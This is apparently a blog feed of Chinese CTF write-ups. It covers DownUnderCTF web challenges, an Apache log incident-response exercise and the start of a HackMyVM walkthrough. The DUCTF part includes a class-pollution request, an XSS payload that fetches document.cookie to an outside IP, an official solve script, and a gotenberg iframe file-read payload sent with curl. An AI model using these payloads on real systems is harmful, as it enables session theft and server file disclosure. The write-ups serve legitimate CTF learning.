    <span class="token keyword">if</span> <span class="token string">"policy"</span> <span class="token keyword">in</span> data <span class="token keyword">and</span> data<span class="token punctuation">[</span><span class="token string">"policy"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"strict"</span><span class="token punctuation">:</span>
        template_env<span class="token punctuation">.</span>env <span class="token operator">=</span> Environment<span class="token punctuation">(</span>loader<span class="token operator">=</span>PackageLoader<span class="token punctuation">(</span><span class="token string">"app"</span><span class="token punctuation">,</span> <span class="token string">"templates"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> autoescape<span class="token operator">=</span>TEMPLATES_ESCAPE_ALL<span class="token punctuation">)</span>
    <span class="token comment"># elif "policy" in data and data["policy"] == "lax":</span>
    <span class="token comment">#     template_env.env = Environment(loader=PackageLoader("app", "templates"), autoescape=TEMPLATES_ESCAPE_NONE)</span>
    <span class="token comment"># TO DO: Add more configurations for allowing LateX, XML etc. to be configured in app</span>
    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"success"</span><span class="token punctuation">:</span> <span class="token string">"true"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/v1/report"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@limiter<span class="token punctuation">.</span>limit</span><span class="token punctuation">(</span><span class="token string">"6 per minute"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">report</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"XSSBOT_URL"</span><span class="token punctuation">,</span> <span class="token string">"http://xssbot:8000"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">/visit'</span></span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'url'</span><span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"APP_URL"</span><span class="token punctuation">,</span> <span class="token string">"http://co2v2:1337"</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token string">'X-SSRF-Protection'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>status<span class="token operator">=</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span></code></pre>
<p>多出admin用户的路由,如果policy为strict会执行设置成允许模板渲染并且会转义，为什么会禁止转义，大概是想防xss<br>再看report这个接口，会构造一个url请求把当前站点post到XSSBOT那里</p>
<pre class="language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">"SESSION_COOKIE_HTTPONLY"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span></code></pre>
<p>看了一下<code>__init__.py</code>发现<code>SESSION_COOKIE_HTTPONLY</code>被设置成立false，意思是可以通过<code>document.cookie</code>窃取cookie<br>通过源码发现flag在cookie里</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>
  <span class="token punctuation">&#123;</span>
    <span class="token string">"domain"</span><span class="token punctuation">:</span> <span class="token string">"co2v2:1337"</span><span class="token punctuation">,</span>
    <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"admin-cookie"</span><span class="token punctuation">,</span>
    <span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token string">"DUCTF&#123;testflag&#125;"</span><span class="token punctuation">,</span>
    <span class="token string">"httponly"</span><span class="token punctuation">:</span> false
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">]</span></code></pre>
<p>也就是说如果能构造xss就能获取flag，能xss需要正确的<code>nonce</code>的值并且需要绕过转义,还需要一个xss触发点<br>前两个条件可以通过上一个题的类污染来实现，触发点猜测通过XSSBOT进行XSS<br>1.第一步将RANDOM_COUNT污染成0，SECRET_NONCE污染成1，TEMPLATES_ESCAPE_ALL污染成FALSE</p>
<pre class="language-none"><code class="language-none">POST &#x2F;save_feedback HTTP&#x2F;1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko&#x2F;20100101 Firefox&#x2F;127.0
Accept: *&#x2F;*
Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
Accept-Encoding: gzip, deflate, br
Referer: http:&#x2F;&#x2F;127.0.0.1:1337&#x2F;feedback
Content-Type: application&#x2F;json
Content-Length: 55
Origin: http:&#x2F;&#x2F;127.0.0.1:1337
Connection: close
Cookie: session&#x3D;.eJwlzsENwzAIAMBdePcBNsY4y0TGgNpv0ryq7t5IXeB0H9jziPMJ2_u44gH7y2GDzMquYa6DangPQ2O1jsXGotRExI45MnwMdplGnOlFFX2RiKNLmSuxpbeQsWZzYtGljT2rGlPQtJUSUWdpncmsB2PFGxoId-Q64_hvCnx_UAcwjQ.ZouxaA.uvZoLAVpP3t4GCeDzKoGzur0RiY
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u&#x3D;1

&#123;

   &quot;__class__&quot;: &#123;
        &quot;__init__&quot;:&#123;
            &quot;__globals__&quot;:&#123;
                &quot;RANDOM_COUNT&quot;: 0,
                &quot;SECRET_NONCE&quot;: &quot;t&quot;,
                &quot;TEMPLATES_ESCAPE_ALL&quot;:false
            &#125;
        &#125;
    &#125;
&#125;</code></pre>
<pre class="language-none"><code class="language-none">HTTP&#x2F;1.1 200 OK
Server: Werkzeug&#x2F;2.3.6 Python&#x2F;3.10.9
Date: Mon, 08 Jul 2024 09:33:03 GMT
Content-Type: application&#x2F;json
Content-Length: 19
Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &#39;nonce-a3a52d289db5308e253e6cea3aa1c6953e7ba613f522ea740413fa3fdb218403&#39; https:&#x2F;&#x2F;ajax.googleapis.com; style-src &#39;self&#39; &#39;nonce-a3a52d289db5308e253e6cea3aa1c6953e7ba613f522ea740413fa3fdb218403&#39; https:&#x2F;&#x2F;cdn.jsdelivr.net; script-src-attr &#39;self&#39; &#39;nonce-a3a52d289db5308e253e6cea3aa1c6953e7ba613f522ea740413fa3fdb218403&#39;; connect-src *; 
Access-Control-Allow-Origin: http:&#x2F;&#x2F;127.0.0.1:1337
Vary: Origin, Cookie
Connection: close

&#123;&quot;success&quot;:&quot;true&quot;&#125;</code></pre>
<p>2.第二步将xss写在博客中<br>先生成一下nonce</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
SECRET_NONCE<span class="token operator">=</span><span class="token string">'t'</span>

<span class="token keyword">def</span> <span class="token function">generate_nonce</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    nonce <span class="token operator">=</span> SECRET_NONCE <span class="token operator">+</span> data 
    sha256_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sha256_hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>nonce<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    hash_hex <span class="token operator">=</span> sha256_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> hash_hex
a<span class="token operator">=</span>generate_nonce<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token comment">#a2fe8952412bc49de813bb82db50d5aa497d6106b6b43c8a72cab443aa017e32</span></code></pre>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script nonce<span class="token operator">=</span><span class="token string">"a2fe8952412bc49de813bb82db50d5aa497d6106b6b43c8a72cab443aa017e32"</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"http://43.143.198.113/"</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
<pre class="language-none"><code class="language-none">POST &#x2F;create_post HTTP&#x2F;1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko&#x2F;20100101 Firefox&#x2F;127.0
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application&#x2F;x-www-form-urlencoded
Content-Length: 214
Origin: http:&#x2F;&#x2F;127.0.0.1:1337
Connection: close
Referer: http:&#x2F;&#x2F;127.0.0.1:1337&#x2F;create_post
Cookie: session&#x3D;.eJwlzsENwzAIAMBdePcBNsY4y0TGgNpv0ryq7t5IXeB0H9jziPMJ2_u44gH7y2GDzMquYa6DangPQ2O1jsXGotRExI45MnwMdplGnOlFFX2RiKNLmSuxpbeQsWZzYtGljT2rGlPQtJUSUWdpncmsB2PFGxoId-Q64_hvCnx_UAcwjQ.ZouxaA.uvZoLAVpP3t4GCeDzKoGzur0RiY
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u&#x3D;1

title&#x3D;&lt;script nonce&#x3D;&quot;a2fe8952412bc49de813bb82db50d5aa497d6106b6b43c8a72cab443aa017e32&quot;&gt;fetch(&quot;http:&#x2F;&#x2F;43.143.198.113&#x2F;&quot;+document.cookie)&lt;&#x2F;script&gt;&amp;content&#x3D;1&amp;public&#x3D;1&amp;save&#x3D;Save+Post</code></pre>

<p>3.设置templates</p>
<pre class="language-none"><code class="language-none">POST &#x2F;admin&#x2F;update-accepted-templates HTTP&#x2F;1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko&#x2F;20100101 Firefox&#x2F;127.0
Accept: *&#x2F;*
Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
Accept-Encoding: gzip, deflate, br
Referer: http:&#x2F;&#x2F;127.0.0.1:1337&#x2F;feedback
Content-Type: application&#x2F;json
Content-Length: 77
Origin: http:&#x2F;&#x2F;127.0.0.1:1337
Connection: close
Cookie: session&#x3D;.eJwlzsENwzAIAMBdePcBNsY4y0TGgNpv0ryq7t5IXeB0H9jziPMJ2_u44gH7y2GDzMquYa6DangPQ2O1jsXGotRExI45MnwMdplGnOlFFX2RiKNLmSuxpbeQsWZzYtGljT2rGlPQtJUSUWdpncmsB2PFGxoId-Q64_hvCnx_UAcwjQ.ZouxaA.uvZoLAVpP3t4GCeDzKoGzur0RiY
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u&#x3D;1

&#123; &quot;title&quot;:&quot;&quot;, &quot;content&quot;:&quot;&quot;, &quot;rating&quot;:&quot;&quot;, &quot;referred&quot;:&quot;&quot;, &quot;policy&quot; : &quot;strict&quot; &#125;</code></pre>
<p>4.report触发xss dns外带出cookie<br><img src="https://ooo.0x0.ooo/2024/07/08/OP07jj.png" alt="OP07jj.png" loading="lazy"><br>官方wp</p>
<pre class="language-python" data-language="python"><code class="language-python">
<span class="token keyword">import</span> httpx
<span class="token keyword">import</span> os

URL <span class="token operator">=</span> <span class="token string">'http://127.0.0.1:1337/'</span>
username <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
xss_payload <span class="token operator">=</span> <span class="token string">'&lt;script nonce="a2fe8952412bc49de813bb82db50d5aa497d6106b6b43c8a72cab443aa017e32">fetch("dns.server/"+document.cookie)&lt;/script>'</span>

client <span class="token operator">=</span> httpx<span class="token punctuation">.</span>Client<span class="token punctuation">(</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL<span class="token punctuation">&#125;</span></span><span class="token string">/register'</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'a'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
r <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL<span class="token punctuation">&#125;</span></span><span class="token string">/login'</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'a'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
r <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL<span class="token punctuation">&#125;</span></span><span class="token string">/save_feedback'</span></span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'content'</span><span class="token punctuation">:</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'rating'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'referred'</span><span class="token punctuation">:</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'title'</span><span class="token punctuation">:</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">"__class__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span> <span class="token string">"__init__"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span> <span class="token string">"__globals__"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span> <span class="token string">"RANDOM_COUNT"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"SECRET_NONCE"</span><span class="token punctuation">:</span> <span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"TEMPLATES_ESCAPE_ALL"</span><span class="token punctuation">:</span> <span class="token boolean">False</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
r <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL<span class="token punctuation">&#125;</span></span><span class="token string">/admin/update-accepted-templates'</span></span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span> <span class="token string">"title"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"rating"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"referred"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"policy"</span> <span class="token punctuation">:</span> <span class="token string">"strict"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
r <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL<span class="token punctuation">&#125;</span></span><span class="token string">/create_post'</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'title'</span><span class="token punctuation">:</span>xss_payload<span class="token punctuation">,</span><span class="token string">'content'</span><span class="token punctuation">:</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'public'</span><span class="token punctuation">:</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'save'</span><span class="token punctuation">:</span><span class="token string">'Save+Post'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
r <span class="token operator">=</span> client<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL<span class="token punctuation">&#125;</span></span><span class="token string">/api/v1/report'</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
···</code></pre>
<h2 id="hah-got-em"><a href="#hah-got-em" class="headerlink" title="hah got em"></a>hah got em</h2><pre class="language-none"><code class="language-none">Oh by the way I love using my new microservice parsing these arrest reports to PDF</code></pre>
<p>附件就给了gotenberg版本8.0.3，该版本存在未授权访问，8.10版本更新了安全策略，但是对比两个版本，发现8.1.0多出一个测试用例，可以拿来攻击<br><a href="https://github.com/gotenberg/gotenberg/compare/v8.0.3...v8.1.0#diff-be84e06649ad8faf29f22ad46330a6e9b83dbaf2d6c35b2a3656313d26a79d35R62">https://github.com/gotenberg/gotenberg/compare/v8.0.3...v8.1.0#diff-be84e06649ad8faf29f22ad46330a6e9b83dbaf2d6c35b2a3656313d26a79d35R62</a></p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>page-break-after<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>/etc/passwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/etc/passwd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>\\localhost/etc/passwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>\\localhost/etc/passwd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre>
<p>简单修改生成一个index.html</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/proc/self/root/etc/flag.txt<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>\\localhost/etc/flag.txt<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<p>然后上传即可</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">--request</span> POST http://ip:port/forms/chromium/convert/html <span class="token parameter variable">--form</span> <span class="token assign-left variable">files</span><span class="token operator">=</span>@index.html <span class="token parameter variable">-o</span> re.pdf</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/09/OPc5Cc.png" alt="OPc5Cc.png" loading="lazy"></p>
<h2 id="i-am-confusion"><a href="#i-am-confusion" class="headerlink" title="i am confusion"></a>i am confusion</h2><pre class="language-none"><code class="language-none">The evil hex bug has taken over our administrative interface of our application. It seems that the secret we used to protect our authentication was very easy to guess. We need to get it back!</code></pre>








]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>第二章-应急响应-apache日志分析</title>
    <url>/posts/c8f379ac/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="language-none"><code class="language-none">账号密码 root apacherizhi

1、提交当天访问次数最多的IP，即黑客IP：
2、黑客使用的浏览器指纹是什么，提交指纹的md5：
3、查看index.php页面被访问的次数，提交次数：
4、查看黑客IP访问了多少次，提交次数：
5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</code></pre>

<h2 id="1、提交当天访问次数最多的IP，即黑客IP"><a href="#1、提交当天访问次数最多的IP，即黑客IP" class="headerlink" title="1、提交当天访问次数最多的IP，即黑客IP"></a>1、提交当天访问次数最多的IP，即黑客IP</h2><p>apache日志目录在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log.1</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-1:/var/log/apache2<span class="token comment"># cat access.log.1 | grep "03/Aug/2023" | awk '&#123;print $1&#125;'| sort | uniq -c</span>
     <span class="token number">29</span> ::1
   <span class="token number">6555</span> <span class="token number">192.168</span>.200.2
      <span class="token number">1</span> <span class="token number">192.168</span>.200.211
      <span class="token number">5</span> <span class="token number">192.168</span>.200.38
      <span class="token number">1</span> <span class="token number">192.168</span>.200.48</code></pre>
<p>访问最多的是<code>192.168.200.2</code><br>flag1 <strong>flag{192.168.200.2}</strong></p>
<h2 id="2、黑客使用的浏览器指纹是什么，提交指纹的md5"><a href="#2、黑客使用的浏览器指纹是什么，提交指纹的md5" class="headerlink" title="2、黑客使用的浏览器指纹是什么，提交指纹的md5"></a>2、黑客使用的浏览器指纹是什么，提交指纹的md5</h2><p>随便抓一个192.168.200.2ip的浏览器</p>
<pre class="language-none"><code class="language-none">192.168.200.2 - - [03&#x2F;Aug&#x2F;2023:08:46:45 +0000] &quot;GET &#x2F;id_rsa.pub HTTP&#x2F;1.1&quot; 404 492 &quot;-&quot; &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36&quot;</code></pre>
<p>知道浏览器指纹是<code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</code><br><img src="https://ooo.0x0.ooo/2024/06/07/OJlgys.png" alt="OJlgys.png" loading="lazy"><br>flag2 <strong>flag{2d6330f380f44ac20f3a02eed0958f66}</strong></p>
<h2 id="3、查看index-php页面被访问的次数，提交次数"><a href="#3、查看index-php页面被访问的次数，提交次数" class="headerlink" title="3、查看index.php页面被访问的次数，提交次数"></a>3、查看index.php页面被访问的次数，提交次数</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-1:/var/log/apache2<span class="token comment"># cat access.log.1 | grep "/index.php" | wc -l</span>
<span class="token number">27</span></code></pre>
<p>flag3 <strong>flag{27}</strong></p>
<h2 id="4、查看黑客IP访问了多少次，提交次数"><a href="#4、查看黑客IP访问了多少次，提交次数" class="headerlink" title="4、查看黑客IP访问了多少次，提交次数"></a>4、查看黑客IP访问了多少次，提交次数</h2><p>由第一题可以知道访问了6555次<br>flag4</p>
<p> <strong>flag{6555}</strong></p>
<h2 id="5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数"><a href="#5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数" class="headerlink" title="5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数"></a>5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数</h2><p>注意是ip个数</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-1:/var/log/apache2<span class="token comment"># cat access.log.1 | grep "03/Aug/2023:08:" |awk '&#123;print $1&#125;'| sort | uniq -c | wc -l</span>
<span class="token number">5</span></code></pre>
<p>flag5 <strong>flag{5}</strong></p>
]]></content>
      <categories>
        <category>玄机应急靶场</category>
      </categories>
      <tags>
        <tag>apache日志</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-thwall</title>
    <url>/posts/28f0aa43/</url>
    <content><![CDATA[<p><strong>难度:Easy</strong></p>
<p><strong>kali:192.168.1.103</strong></p>
<p><strong>靶机:192.168.1.100</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  arp-scan <span class="token parameter variable">-l</span>                                                                                                                                                                                                      <span class="token punctuation">[</span><span class="token number">10</span>:38:04<span class="token punctuation">]</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.1.103
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.1.1	<span class="token number">78</span>:60:5b:04:b4:8c	TP-LINK TECHNOLOGIES CO.,LTD.
<span class="token number">192.168</span>.1.100	08:00:27:fe:ef:0c	PCS Systemtechnik GmbH
<span class="token number">192.168</span>.1.104	<span class="token number">44</span>:e5:17:0a:27:01	Intel Corporate</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  nmap <span class="token number">192.168</span>.1.100                                                                                                                                                                                               <span class="token punctuation">[</span><span class="token number">10</span>:39:16<span class="token punctuation">]</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-07 <span class="token number">10</span>:40 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.100
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000093s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http</code></pre>
<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://ooo.0x0.ooo/2024/08/07/OtzIUP.png" alt="OtzIUP.png" loading="lazy"><br>很干净的主页，扫一下目录</p>
